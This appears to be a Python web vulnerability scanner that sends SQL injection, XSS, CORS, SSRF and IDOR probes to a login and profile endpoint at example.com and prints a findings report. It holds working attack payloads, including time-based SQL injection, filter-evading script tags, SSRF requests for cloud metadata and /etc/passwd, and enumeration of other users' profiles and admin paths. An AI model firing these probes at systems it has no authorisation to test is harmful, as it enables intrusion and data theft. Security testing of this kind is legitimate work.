import requests
import base64
import time


BASE_URL = "http://example.com"
LOGIN_URL = f"{BASE_URL}/login"
CREDENTIALS = {"username": "sara", "password": "1234"}
SESSION_COOKIE = {"session": "abc123"}

results = []

def log(attack, field, payload, severity):
    results.append({
        "attack": attack,
        "field": field, 
        "payload": payload,
        "severity": severity
    })
    print(f"  {'🔴' if severity=='Critical' else '🟡'} [{attack}] {field}: {payload}")

def print_separator(title):
    print(f"\n{'='*50}")
    print(f"  {title}")
    print(f"{'='*50}")

# ============
# 1. SQLi
# ============
print_separator("1. SQL INJECTION")

def test_sqli():
    # Error Test
    r = requests.post(LOGIN_URL, data={**CREDENTIALS, "username": "sara'"})
    if "sql" in r.text.lower() or "syntax" in r.text.lower() or r.status_code == 500:
        log("SQLi", "username", "sara'", "Critical")
        return

    # Boolean Test
    true_r  = requests.post(LOGIN_URL, data={**CREDENTIALS, "username": "sara' AND '1'='1'--"})
    false_r = requests.post(LOGIN_URL, data={**CREDENTIALS, "username": "sara' AND '1'='2'--"})
    if true_r.text != false_r.text:
        log("SQLi", "username", "Boolean Blind", "Critical")
        return

    # Time-Based Test
    start = time.time()
    requests.post(LOGIN_URL, data={**CREDENTIALS, "username": "sara' AND SLEEP(5)--"})
    if time.time() - start >= 5:
        log("SQLi", "username", "SLEEP(5)", "Critical")
        return

    # Password Field
    r = requests.post(LOGIN_URL, data={**CREDENTIALS, "password": "1234'"})
    if "sql" in r.text.lower() or r.status_code == 500:
        log("SQLi", "password", "1234'", "Critical")
        return

    # Cookie
    r = requests.post(LOGIN_URL, data=CREDENTIALS, cookies={"session": "abc123'"})
    if "sql" in r.text.lower() or r.status_code == 500:
        log("SQLi", "cookie", "session'", "Critical")
        return

    print("  ✅ Not vulnerable to SQLi")

test_sqli()
time.sleep(1)

# ============
# 2. XSS
# ============
print_separator("2. XSS")

xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<scr<script>ipt>alert(1)</script>",
    "<script>alert`1`</script>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
]

def check_xss(response, payload):
    return payload in response.text or "alert" in response.text

def test_xss():
    found = False
    
    # Username & Password
    for field in ["username", "password"]:
        for payload in xss_payloads:
            data = {**CREDENTIALS, field: payload}
            r = requests.post(LOGIN_URL, data=data)
            if check_xss(r, payload):
                log("XSS", field, payload, "Critical")
                found = True
                break
        time.sleep(0.3)
    
    # Cookie
    for payload in xss_payloads:
        r = requests.post(LOGIN_URL, data=CREDENTIALS,
            cookies={"session": payload})
        if check_xss(r, payload):
            log("XSS", "cookie", payload, "Critical")
            found = True
            break
        time.sleep(0.3)
    
    # User-Agent
    for payload in xss_payloads:
        r = requests.post(LOGIN_URL, data=CREDENTIALS,
            headers={"User-Agent": payload})
        if check_xss(r, payload):
            log("XSS", "User-Agent", payload, "Critical")
            found = True
            break
        time.sleep(0.3)
    
    if not found:
        print("  ✅ Not vulnerable to XSS")

test_xss()
time.sleep(1)

# ============
# 3. CORS
# ============
print_separator("3. CORS")

def test_cors():
    origins = [
        "https://attacker.com",
        "null",
        "https://attacker.example.com",
        "https://example.com.attacker.com",
    ]
    
    found = False
    for origin in origins:
        r = requests.post(LOGIN_URL, data=CREDENTIALS,
            headers={"Origin": origin})
        
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        
        if acao == origin and acac == "true":
            log("CORS", "Origin", origin, "Critical")
            found = True
        elif acao == "*" and acac == "true":
            log("CORS", "Origin", "Wildcard + Credentials", "Critical")
            found = True
        elif acao == origin:
            log("CORS", "Origin", origin, "Medium")
            found = True
        
        time.sleep(0.3)
    
    if not found:
        print("  ✅ Not vulnerable to CORS")

test_cors()
time.sleep(1)

# ============
# 4. SSRF
# ============
print_separator("4. SSRF")

ssrf_targets = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1/admin",
    "file:///etc/passwd",
]

ssrf_fields  = ["redirect", "url", "next", "return", "returnUrl", "src"]
ssrf_headers = ["X-Forwarded-For", "X-Forwarded-Host", "Referer"]

def check_ssrf(response):
    keywords = ["root:", "localhost", "internal", "aws", "metadata", "ami-id"]
    return any(k in response.text.lower() for k in keywords)

def test_ssrf():
    found = False
    
    # Body Fields
    for field in ssrf_fields:
        for target in ssrf_targets:
            try:
                data = {**CREDENTIALS, field: target}
                r = requests.post(LOGIN_URL, data=data, timeout=10)
                if check_ssrf(r):
                    log("SSRF", field, target, "Critical")
                    found = True
            except requests.exceptions.Timeout:
                log("SSRF", field, f"Timeout → {target}", "Medium")
                found = True
            time.sleep(0.3)
    
    # Headers
    for header in ssrf_headers:
        for target in ssrf_targets[:3]:
            try:
                r = requests.post(LOGIN_URL, data=CREDENTIALS,
                    headers={header: target}, timeout=10)
                if check_ssrf(r):
                    log("SSRF", header, target, "Critical")
                    found = True
            except requests.exceptions.Timeout:
                log("SSRF", header, f"Timeout → {target}", "Medium")
                found = True
            time.sleep(0.3)
    
    if not found:
        print("  ✅ Not vulnerable to SSRF")

test_ssrf()
time.sleep(1)

# ============
# 5. IDOR & Access Control
# ============
print_separator("5. IDOR & ACCESS CONTROL")

my_response = requests.get(f"{BASE_URL}/profile?id=123", cookies=SESSION_COOKIE)

def test_idor():
    found = False
    
    # Numeric IDOR
    for user_id in range(1, 10):
        if user_id == 123:
            continue
        r = requests.get(f"{BASE_URL}/profile?id={user_id}",
            cookies=SESSION_COOKIE)
        if r.status_code == 200 and r.text != my_response.text:
            log("IDOR", "id", str(user_id), "Critical")
            found = True
        time.sleep(0.3)
    
    # Username IDOR
    for username in ["admin", "administrator", "root", "user1"]:
        r = requests.get(f"{BASE_URL}/profile?user={username}",
            cookies=SESSION_COOKIE)
        if r.status_code == 200:
            log("IDOR", "username", username, "Critical")
            found = True
        time.sleep(0.3)
    
    # Base64 IDOR
    for user_id in range(1, 5):
        encoded = base64.b64encode(str(user_id).encode()).decode()
        r = requests.get(f"{BASE_URL}/profile?id={encoded}",
            cookies=SESSION_COOKIE)
        if r.status_code == 200 and r.text != my_response.text:
            log("IDOR", "base64_id", encoded, "Critical")
            found = True
        time.sleep(0.3)
    
    # Admin Access Control
    admin_paths = ["/admin", "/admin/users", "/dashboard", "/manage"]
    methods = ["GET", "POST", "PUT"]
    
    for path in admin_paths:
        for method in methods:
            r = requests.request(method, f"{BASE_URL}{path}",
                cookies=SESSION_COOKIE)
            if r.status_code not in [403, 404]:
                log("Access Control", method, path, "Critical")
                found = True
            time.sleep(0.2)
    
    if not found:
        print("  ✅ Not vulnerable to IDOR/Access Control")

test_idor()

# ============
# Final Report
# ============
print_separator("FINAL REPORT")

if results:
    print(f"\n  Found {len(results)} vulnerabilities:\n")
    for i, r in enumerate(results, 1):
        severity_icon = "🔴" if r["severity"] == "Critical" else "🟡"
        print(f"  {i}. {severity_icon} [{r['severity']}] {r['attack']}")
        print(f"     Field: {r['field']}")
        print(f"     Payload: {r['payload']}\n")
else:
    print("\n  ✅ No vulnerabilities found!")

print("=" * 50)
